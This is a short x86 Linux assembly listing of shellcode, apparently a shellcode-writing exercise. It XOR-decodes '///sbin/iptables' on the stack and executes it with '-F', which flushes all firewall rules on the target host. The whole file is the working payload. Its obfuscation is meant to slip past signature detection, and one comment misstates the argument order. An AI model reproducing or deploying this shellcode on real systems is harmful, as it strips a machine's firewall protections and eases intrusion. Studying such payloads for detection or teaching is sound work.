global _start

section .text

_start:
	xor ecx, ecx			;; Clear ECX
	mul ecx				;; Clear EAX, EBX, EDX
	push eax			;; Push null bytes
	mov bx, 0x4631			;; Store bytes for string '-F' (incremented by 4) in EBX
	mov cl, 0x4			;; Store byte for offset in ECX
	sub ebx, ecx			;; Subtract string value in EBX by offset in ECX
	push ebx			;; Push bytes for string '-F' (0x462d)
	mov esi,esp			;; Store address to top of stack in ESI
	push eax			;; Push null bytes
	
	push 0x73652a4f			;; Push bytes for '///sbin/iptables" (Part #4, XOR'd)
	push 0x61743644			;; Push bytes for '///sbin/iptables" (Part #3, XOR'd)
	push 0x2f6e2f4f			;; Push bytes for '///sbin/iptables" (Part #2, XOR'd)
	push 0x732f6902			;; Push bytes for '///sbin/iptables" (Part #1, XOR'd)
	
xor:
	dec ecx				;; Decrease offset counter
	mov ebx, [esp + ecx * 4]	;; Store DWORD at ESP + offset * 4 [#1, #2, #3, #4 from above]
	xor ebx, [esi]			;; XOR value in EBX with XOR key (0x462d)
	mov [esp + ecx * 4], ebx	;; Store new DWORD value back at ESP + offset * 4
	cmp ecx, edx			;; Check if another loop iteration is needed
	jnz short xor			;; Jump to start of XOR decoding if necessary

exec:
	mov ebx, esp			;; Store address to top of stack in EBX
	push eax			;; Push null bytes
	push esi			;; Push address to arguments ('-F')
	push ebx			;; Push address to filepath ('//sbin/iptables')
	mov ecx, esp			;; Store address to top of stack in ECX
	add al, 11			;; Add 11 to EAX for execve syscall #
	int 0x80			;; Execute syscall, as in execve('///sbin/iptables', [NULL, '-F'])

